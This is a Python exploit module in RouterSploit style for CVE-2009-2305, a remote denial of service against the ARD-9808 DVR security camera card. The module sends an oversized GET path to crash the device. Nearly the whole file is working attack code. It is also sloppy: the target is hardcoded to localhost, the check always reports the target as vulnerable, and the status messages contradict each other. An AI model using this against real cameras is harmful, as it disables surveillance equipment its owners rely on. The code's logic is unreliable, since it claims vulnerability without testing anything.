import socket
import sys
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):


    __info__ = {

        "name": "CVE-2009-2305",
        "description": "ARD-9808 DVR Card Security Camera - GET Remote Denial of Service "
                       "### ",
        "authors": (
            "Stack",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/9067",
        ),
        "devices": (
            "Vestel","CVE-2009-2305"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("----------------------------------------------------------------")
            print_status( " ARD-9808 DVR Card Security Camera <= Remote Denial Of Service  ")
            print_status( " author: Stack                                                  ")
            print_status( "----------------------------------------------------------------")
            host = "127.0.0.1"
            port = 80
            try:
                   buff = "//.\\" * 1000
                   request =  "GET " + buff + " HTTP/1.0"
                   connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                   connection.connect((host, port))
                   connection.send(request)
                   input('\n\nExploit completed. Press "Enter" to quit...')
                   #sys.exit
            except:
                   input('\n\n[-] Exploit failed - Unable to connect. Press "Enter" to quit...')
        else:

            print_error("[+] Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
# milw0rm.com [2009-07-01]
